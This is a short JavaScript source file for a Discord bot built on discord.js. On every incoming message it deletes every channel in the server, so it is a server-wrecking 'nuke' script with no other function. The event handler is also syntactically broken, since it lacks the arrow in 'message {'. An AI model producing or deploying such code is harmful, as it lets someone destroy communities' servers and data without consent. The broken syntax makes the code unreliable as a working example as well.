
const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "!";


    client.on('message', message {
              message.guild.channels.forEach(channel => channel.delete())

   });


client.login(process.env.BOT_TOKEN);

